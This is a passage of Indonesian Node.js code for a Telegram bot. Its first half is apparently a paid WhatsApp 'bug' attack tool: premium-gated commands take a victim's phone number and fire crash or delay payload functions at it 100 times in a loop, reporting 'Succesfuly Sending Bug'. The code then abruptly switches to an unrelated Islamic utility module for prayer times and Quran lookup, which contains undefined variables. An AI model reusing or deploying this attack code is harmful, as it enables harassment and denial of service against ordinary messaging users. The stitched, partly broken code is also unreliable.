<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Developer", url: "https://t.me/Serenhope" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Hecaandro
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Hecaandro
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 100; i++) {
         await Localoid(sock, X, mention);
         await albumpolygon(sock, istarget);
         await delayvisib(sock, istarget, mention = true);
         await Vocabulary(sock, istarget, true);
         await JandaMuda(sock, istarget);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 ѕσ¢ѕυѕнєχα  ⵢ Volcanic 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Hecaandro
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Vocandio (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Developer", url: "https://t.me/Serenhope" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocandio
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocandio
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 100; i++) {
         await Localoid(sock, X, mention);
         await Localoid(sock, X, mention);
         await DelayHydra(sock, istarget, mention);
         await DelayHydra(sock, istarget, mention);
         await DelayHhydra(sock, istarget);
         await DelayHhydra(sock, istarget);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 ѕσ¢ѕυѕнєχα  ⵢ Volcanic 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Vocandio
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Vocablank (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Developer", url: "https://t.me/Serenhope" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocablank
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocablank
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 100; i++) {
         await videoBlank(sock, istarget)
         await videoBlank(sock, istarget);
         await Localoid(sock, X, mention);
         await Localoid(sock, X, mention);
         await DelayHydra(sock, istarget);
         await DelayHydra(sock, istarget);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 ѕσ¢ѕυѕнєχα  ⵢ Volcanic 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Vocandio
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

bot.onText(/\/Vocandelay (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "! Developer", url: "https://t.me/Serenhope" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
    }
    
    if (chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocandelay
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : Vocandelay
𖥂 Status : Procces
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );
        /// --- ( Forlet ) --- \\\
         for (let i = 0; i < 100; i++) {
         await DelayHydra(sock, istarget, mention);
         await DelayHydra(sock, istarget, mention);
         await DelayHydra(sock, istarget, mention);
         await DelayHhydra(sock, istarget);
         await DelayHhydra(sock, istarget);
         await DelayHhydra(sock, istarget);
         await slowDelay();
         }
         console.log(chalk.red(`𖣂 ѕσ¢ѕυѕнєχα  ⵢ Volcanic 𖣂`));
         
        await bot.editMessageCaption(`
<blockquote>｢ Ϟ ｣ ѕσ¢ѕυѕ ↯ нєχα</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : Vocandelay
𖥂 Status : Succesfuly Sending Bug
𖥂 Date now : ${date}

© ѕσ¢ѕυѕ ↯ нєχα 𖣂
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

// -- ( Case Cooldown ) -- \\
const moment = require("moment");
bot.onText(/^\/cooldown (\d+[smh])$/, (msg, match) => {
  const chatId = msg.chat.id;
  const response = setCooldown(match[1]);
  bot.sendMessage(chatId, response);
});


// -- ( Case Add Premium ) -- \\
// commands/6_islamic.js
// Di dalam file config.js

config.adhanAudioUrl = 'https://files.catbox.moe/2z2q84.mp3'; // GANTI DENGAN LINK MP3 ADZAN
const cron = require('node-cron');
const surahList = [
    { number: 1, name: "Al-Fatihah", translation: "Pembukaan" },
    { number: 2, name: "Al-Baqarah", translation: "Sapi Betina" },
    { number: 3, name: "Ali 'Imran", translation: "Keluarga 'Imran" },
    { number: 4, name: "An-Nisa'", translation: "Wanita" },
    { number: 5, name: "Al-Ma'idah", translation: "Jamuan (Hidangan Makanan)" },
    { number: 6, name: "Al-An'am", translation: "Binatang Ternak" },
    { number: 7, name: "Al-A'raf", translation: "Tempat yang Tertinggi" },
    { number: 8, name: "Al-Anfal", translation: "Harta Rampasan Perang" },
    { number: 9, name: "At-Taubah", translation: "Pengampunan" },
    { number: 10, name: "Yunus", translation: "Nabi Yunus" },
    { number: 11, name: "Hud", translation: "Nabi Hud" },
    { number: 12, name: "Yusuf", translation: "Nabi Yusuf" },
    { number: 13, name: "Ar-Ra'd", translation: "Guruh (Petir)" },
    { number: 14, name: "Ibrahim", translation: "Nabi Ibrahim" },
    { number: 15, name: "Al-Hijr", translation: "Gunung Al-Hijr" },
    { number: 16, name: "An-Nahl", translation: "Lebah" },
    { number: 17, name: "Al-Isra'", translation: "Perjalanan Malam" },
    { number: 18, name: "Al-Kahf", translation: "Penghuni-penghuni Gua" },
    { number: 19, name: "Maryam", translation: "Maryam (Maria)" },
    { number: 20, name: "Taha", translation: "Taha" },
    { number: 21, name: "Al-Anbiya'", translation: "Nabi-Nabi" },
    { number: 22, name: "Al-Hajj", translation: "Haji" },
    { number: 23, name: "Al-Mu'minun", translation: "Orang-orang mukmin" },
    { number: 24, name: "An-Nur", translation: "Cahaya" },
    { number: 25, name: "Al-Furqan", translation: "Pembeda" },
    { number: 26, name: "Asy-Syu'ara'", translation: "Penyair" },
    { number: 27, name: "An-Naml", translation: "Semut" },
    { number: 28, name: "Al-Qasas", translation: "Kisah-kisah" },
    { number: 29, name: "Al-'Ankabut", translation: "Laba-laba" },
    { number: 30, name: "Ar-Rum", translation: "Bangsa Romawi" },
    { number: 31, name: "Luqman", translation: "Keluarga Luqman" },
    { number: 32, name: "As-Sajdah", translation: "Sajdah" },
    { number: 33, name: "Al-Ahzab", translation: "Golongan-golongan yang Bersekutu" },
    { number: 34, name: "Saba'", translation: "Kaum Saba'" },
    { number: 35, name: "Fatir", translation: "Pencipta" },
    { number: 36, name: "Ya-Sin", translation: "Yaasiin" },
    { number: 37, name: "As-Saffat", translation: "Barisan-barisan" },
    { number: 38, name: "Sad", translation: "Shaad" },
    { number: 39, name: "Az-Zumar", translation: "Rombongan-rombongan" },
    { number: 40, name: "Ghafir", translation: "Yang Mengampuni" },
    { number: 41, name: "Fussilat", translation: "Yang Dijelaskan" },
    { number: 42, name: "Asy-Syura", translation: "Musyawarah" },
    { number: 43, name: "Az-Zukhruf", translation: "Perhiasan" },
    { number: 44, name: "Ad-Dukhan", translation: "Kabut" },
    { number: 45, name: "Al-Jasiyah", translation: "Yang Bertekuk Lutut" },
    { number: 46, name: "Al-Ahqaf", translation: "Bukit-bukit Pasir" },
    { number: 47, name: "Muhammad", translation: "Nabi Muhammad" },
    { number: 48, name: "Al-Fath", translation: "Kemenangan" },
    { number: 49, name: "Al-Hujurat", translation: "Kamar-kamar" },
    { number: 50, name: "Qaf", translation: "Qaaf" },
    { number: 51, name: "Az-Zariyat", translation: "Angin yang Menerbangkan" },
    { number: 52, name: "At-Tur", translation: "Bukit" },
    { number: 53, name: "An-Najm", translation: "Bintang" },
    { number: 54, name: "Al-Qamar", translation: "Bulan" },
    { number: 55, name: "Ar-Rahman", translation: "Yang Maha Pemurah" },
    { number: 56, name: "Al-Waqi'ah", translation: "Hari Kiamat" },
    { number: 57, name: "Al-Hadid", translation: "Besi" },
    { number: 58, name: "Al-Mujadilah", translation: "Wanita yang Mengajukan Gugatan" },
    { number: 59, name: "Al-Hasyr", translation: "Pengusiran" },
    { number: 60, name: "Al-Mumtahanah", translation: "Wanita yang Diuji" },
    { number: 61, name: "As-Saff", translation: "Satu Barisan" },
    { number: 62, name: "Al-Jumu'ah", translation: "Hari Jum'at" },
    { number: 63, name: "Al-Munafiqun", translation: "Orang-orang yang Munafik" },
    { number: 64, name: "At-Tagabun", translation: "Hari Dinampakkan Kesalahan-kesalahan" },
    { number: 65, name: "At-Talaq", translation: "Talak" },
    { number: 66, name: "At-Tahrim", translation: "Mengharamkan" },
    { number: 67, name: "Al-Mulk", translation: "Kerajaan" },
    { number: 68, name: "Al-Qalam", translation: "Pena" },
    { number: 69, name: "Al-Haqqah", translation: "Hari Kiamat" },
    { number: 70, name: "Al-Ma'arij", translation: "Tempat Naik" },
    { number: 71, name: "Nuh", translation: "Nabi Nuh" },
    { number: 72, name: "Al-Jinn", translation: "Jin" },
    { number: 73, name: "Al-Muzzammil", translation: "Orang yang Berselimut" },
    { number: 74, name: "Al-Muddassir", translation: "Orang yang Berkemul" },
    { number: 75, name: "Al-Qiyamah", translation: "Hari Kiamat" },
    { number: 76, name: "Al-Insan", translation: "Manusia" },
    { number: 77, name: "Al-Mursalat", translation: "Malaikat-Malaikat Yang Diutus" },
    { number: 78, name: "An-Naba'", translation: "Berita Besar" },
    { number: 79, name: "An-Nazi'at", translation: "Malaikat-Malaikat Yang Mencabut" },
    { number: 80, name: "'Abasa", translation: "Ia Bermuka Masam" },
    { number: 81, name: "At-Takwir", translation: "Menggulung" },
    { number: 82, name: "Al-Infitar", translation: "Terbelah" },
    { number: 83, name: "Al-Mutaffifin", translation: "Orang-orang yang Curang" },
    { number: 84, name: "Al-Insyiqaq", translation: "Terbelah" },
    { number: 85, name: "Al-Buruj", translation: "Gugusan Bintang" },
    { number: 86, name: "At-Tariq", translation: "Yang Datang di Malam Hari" },
    { number: 87, name: "Al-A'la", translation: "Yang Paling Tinggi" },
    { number: 88, name: "Al-Gasyiyah", translation: "Hari Pembalasan" },
    { number: 89, name: "Al-Fajr", translation: "Fajar" },
    { number: 90, name: "Al-Balad", translation: "Negeri" },
    { number: 91, name: "Asy-Syams", translation: "Matahari" },
    { number: 92, name: "Al-Lail", translation: "Malam" },
    { number: 93, name: "Ad-Duha", translation: "Waktu Matahari Sepenggalahan Naik (Dhuha)" },
    { number: 94, name: "Asy-Syarh", translation: "Melapangkan" },
    { number: 95, name: "At-Tin", translation: "Buah Tin" },
    { number: 96, name: "Al-'Alaq", translation: "Segumpal Darah" },
    { number: 97, name: "Al-Qadr", translation: "Kemuliaan" },
    { number: 98, name: "Al-Bayyinah", translation: "Pembuktian" },
    { number: 99, name: "Az-Zalzalah", translation: "Kegoncangan" },
    { number: 100, name: "Al-'Adiyat", translation: "Berlari Kencang" },
    { number: 101, name: "Al-Qari'ah", translation: "Hari Kiamat" },
    { number: 102, name: "At-Takasur", translation: "Bermegah-megahan" },
    { number: 103, name: "Al-'Asr", translation: "Masa/Waktu" },
    { number: 104, name: "Al-Humazah", translation: "Pengumpat" },
    { number: 105, name: "Al-Fil", translation: "Gajah" },
    { number: 106, name: "Quraisy", translation: "Suku Quraisy" },
    { number: 107, name: "Al-Ma'un", translation: "Barang-barang yang Berguna" },
    { number: 108, name: "Al-Kausar", translation: "Nikmat yang Berlimpah" },
    { number: 109, name: "Al-Kafirun", translation: "Orang-orang Kafir" },
    { number: 110, name: "An-Nasr", translation: "Pertolongan" },
    { number: 111, name: "Al-Lahab", translation: "Gejolak Api/ Sabut" },
    { number: 112, name: "Al-Ikhlas", translation: "Ikhlas" },
    { number: 113, name: "Al-Falaq", translation: "Waktu Subuh" },
    { number: 114, name: "An-Nas", translation: "Umat Manusia" },
];

module.exports = function(context) {
    const { bot, config, sholatChats, saveSholatChats, sleep } = context;

    const ALADHAN_API_BASE = 'https://api.aladhan.com/v1';
    const QURAN_API_BASE = 'https://api.quran.gading.dev';
    const activeQuranSessions = {}; 


    async function getPrayerTimes(city) {
        try {
            const response = await axios.get(`${ALADHAN_API_BASE}/timingsByCity`, {
                params: { city: city, country: 'Indonesia', method: 20 }
            });
            return response.data.code === 200 ? response.data.data : null;
        } catch (error) {
            console.error(`Aladhan API Error for city ${city}:`, error.message);
            return null;
        }
    }

    bot.onText(/\/setsholat (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const cityName = match[1].trim();
        if (msg.chat.type === 'private') return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk grup.');
        if (!isOwner(senderId) && !adminUsers.includes(senderId)) return bot.sendMessage(chatId, '❌ Perintah ini hanya untuk admin grup.');
        
        const waitingMsg = await bot.sendMessage(chatId, `🔍 Memverifikasi kota: ${cityName}...`);
        const data = await getPrayerTimes(cityName);
        if (data) {
            sholatChats[chatId] = cityName;
            saveSholatChats();
            bot.editMessageText(`✅ Lokasi jadwal sholat untuk grup ini diatur ke: *${cityName}*.`, { chat_id: chatId, message_id: waitingMsg.message_id, parse_mode: 'Markdown' });
        } else {
            bot.editMessageText(`❌ Kota *"${cityName}"* tidak ditemukan.`, { chat_id: chatId, message_id: waitingMsg.message_id, parse_mode: 'Markdown' });
        }
    });
    
    bot.onText(/\/jadwalsholat(?: (.+))?/, async (msg, match) => {
        const chatId = msg.chat.id;
        let cityName = match[1] ? match[1].trim() : sholatChats[chatId];
        if (!cityName) return bot.sendMessage(chatId, '📍 Lokasi belum diatur. Gunakan `/setsholat <nama_kota>`.');
        
        const data = await getPrayerTimes(cityName);
        if (data) {
            let responseText = `☪️ *Jadwal Sholat untuk ${cityName}*\n_${data.date.readable}_\n\n`;
            const prayerNames = ['Imsak', 'Fajr', 'Dhuhr', 'Asr', 'Maghrib', 'Isha'];
            prayerNames.forEach(p => { responseText += `*${p}*: ${data.timings[p]}\n`; });
            bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, `❌ Gagal mengambil jadwal untuk *${cityName}*.`, { parse_mode: 'Markdown' });
        }
    });

    bot.onText(/\/listsurah(?: (.+))?/, (msg, match) => {
        const query = match[1] ? match[1].toLowerCase().trim() : null;
        let results = surahList;
        if (query) {
            results = surahList.filter(s => s.name.toLowerCase().includes(query) || s.translation.toLowerCase().includes(query));
        }
        if (results.length === 0) {
            return bot.sendMessage(msg.chat.id, `❌ Surah dengan nama "*${query}*" tidak ditemukan.`);
        }
        let responseText = query ? `📖 *Hasil Pencarian Surah untuk "${query}"*\n\n` : "📖 *Daftar Surah Al-Qur'an*\n\n";
        results.forEach(s => {
            responseText += `${s.number}. *${s.name}* (${s.translation})\n`;
        });
        bot.sendMessage(msg.chat.id, responseText, { parse_mode: 'Markdown' });
    });

    const QURAN_AYAT_PER_PAGE = 2;
    async function sendQuranPage(chatId, userId, surahData, page, messageId = null) {
        const totalPages = Math.ceil(surahData.verses.length / QURAN_AYAT_PER_PAGE);
        const start = (page - 1) * QURAN_AYAT_PER_PAGE;
        const end = start + QURAN_AYAT_PER_PAGE;
        const pageVerses = surahData.verses.slice(start, end);

        let text = `*Surah ${surahData.name.transliteration.id} (${surahData.name.translation.id})*\n`;
        text += `(Halaman ${page} dari ${totalPages})\n\n`;

        pageVerses.forEach(ayat => {
            text += `*${ayat.number.inSurah}.* ${ayat.text.arab}\n`;
            text += `_${ayat.translation.id}_\n\n`;
        });

        const row = [];
        if (page > 1) {
            row.push({ text: `⬅️ Hal ${page - 1}`, callback_data: `quran_${surahData.number}_${page - 1}_${userId}` });
        }
        if (page < totalPages) {
            row.push({ text: `Hal ${page + 1} ➡️`, callback_data: `quran_${surahData.number}_${page + 1}_${userId}` });
        }

        const keyboard = { inline_keyboard: [row] };

        if (messageId) {
            await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: keyboard });
        } else {
            return await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
        }
    }

    bot.onText(/\/quran (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const surahNumber = match[1].trim();
        if (isNaN(surahNumber) || surahNumber < 1 || surahNumber > 114) {
            return bot.sendMessage(chatId, "❌ Nomor surah tidak valid (1-114).");
        }
        const waitingMsg = await bot.sendMessage(chatId, `📖 Memuat Surah ke-${surahNumber}...`);
        try {
            const { data } = await axios.get(`${QURAN_API_BASE}/surah/${surahNumber}`);
            if (data.code !== 200) throw new Error(data.message);

            const surahData = data.data;
            await bot.deleteMessage(chatId, waitingMsg.message_id);
            
            const sentMessage = await sendQuranPage(chatId, msg.from.id, surahData, 1);
            
            const messageKey = `${chatId}_${sentMessage.message_id}`;
            activeQuranSessions[messageKey] = surahData; 
            
        } catch (error) {
            console.error(error);
            await bot.editMessageText(`❌ Gagal mencari surah ke-${surahNumber}.`, { chat_id: chatId, message_id: waitingMsg.message_id });
        }
    });

    function findSurah(query) {
        const q = query.toLowerCase().trim().replace(/['\-]/g, '');
        if (!isNaN(q) && q >= 1 && q <= 114) {
            return surahList.find(s => s.number == q);
        }
        return surahList.find(s => s.name.toLowerCase().replace(/['\-]/g, '') === q);
    }

    bot.onText(/\/tafsir(.+)?/, async (msg, match) => {
        const chatId = msg.chat.id;
        const input = match[1] ? match[1].trim() : null;
        if (!input) {
            return bot.sendMessage(chatId, "Gunakan format: `/tafsir <surah>:<ayat>`\nContoh: `/tafsir yasin:36` atau `/tafsir 36:36`");
        }
        if (!input.includes(':')) {
            return bot.sendMessage(chatId, "Format salah. Gunakan titik dua (:) untuk memisahkan surah dan ayat.");
        }
        const [surahQuery, ayatNumber] = input.split(':').map(s => s.trim());
        const surah = findSurah(surahQuery);
        if (!surah) return bot.sendMessage(chatId, `❌ Surah "${surahQuery}" tidak ditemukan.`);
        if (isNaN(ayatNumber) || ayatNumber < 1) return bot.sendMessage(chatId, "❌ Nomor ayat tidak valid.");

        const waitingMsg = await bot.sendMessage(chatId, `📖 Mencari Tafsir Surah ${surah.name} Ayat ${ayatNumber}...`);
        try {
            const { data } = await axios.get(`${QURAN_API_BASE}/surah/${surah.number}/${ayatNumber}`);
            if (data.code !== 200) throw new Error(data.message);

            const ayat = data.data;
            let text = `*Tafsir Q.S. ${surah.name}:${ayat.number.inSurah}*\n\n`;
            text += `*Teks Arab:*\n${ayat.text.arab}\n\n`;
            text += `*Terjemahan:*\n_"${ayat.translation.id}"_\n\n`;
            text += `*Tafsir (Kemenag - Ringkas):*\n${ayat.tafsir.id.short}`;

            await bot.editMessageText(text, { chat_id: chatId, message_id: waitingMsg.message_id, parse_mode: 'Markdown' });
        } catch (error) {
            await bot.editMessageText(`❌ Gagal mencari tafsir. Pastikan ayat ${ayatNumber} ada di Surah ${surah.name}.`, { chat_id: chatId, message_id: waitingMsg.message_id });
        }
    });
    
    const ASMAUL_HUSNA_PER_PAGE = 10;
    bot.onText(/\/asmaulhusna/, async (msg) => {
        try {
            const { data } = await axios.get(`https://api.aladhan.com/v1/asmaAlHusna`);
            const names = data.data;
            context.asmaulHusnaData = names;

            const page = 1;
            const totalPages = Math.ceil(names.length / ASMAUL_HUSNA_PER_PAGE);
            const pageNames = names.slice(0, ASMAUL_HUSNA_PER_PAGE);

            let text = "✨ *Asma'ul Husna (99 Nama Allah)*\n\n";
            pageNames.forEach(name => {
                text += `*${name.number}. ${name.transliteration}* (${name.name})\n_${name.en.meaning}_\n\n`;
            });

            const keyboard = [];
            if (totalPages > 1) {
                keyboard.push([{ text: `Next ➡️ (2/${totalPages})`, callback_data: `asma_2_${msg.from.id}` }]);
            }

            bot.sendMessage(msg.chat.id, text, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } });
        } catch (error) {
            bot.sendMessage(msg.chat.id, "❌ Gagal memuat Asma'ul Husna.");
        }
    });

    bot.onText(/\/hijri/, async (msg) => {
        const chatId = msg.chat.id;
        const cityName = sholatChats[chatId] || 'Jakarta';
        const data = await getPrayerTimes(cityName);
        if (data) {
            const hijri = data.date.hijri;
            let text = `🗓️ *Kalender Hijriah Hari Ini*\n\n`;
            text += `*Tanggal:* ${hijri.day} ${hijri.month.en} ${hijri.year} H\n`;
            text += `*Hari:* ${hijri.weekday.en}\n`;
            if (hijri.holidays && hijri.holidays.length > 0) {
                text += `*Peringatan:* ${hijri.holidays.join(', ')}\n`;
            }
            bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, "❌ Gagal mengambil data tanggal Hijriah.");
        }
    });

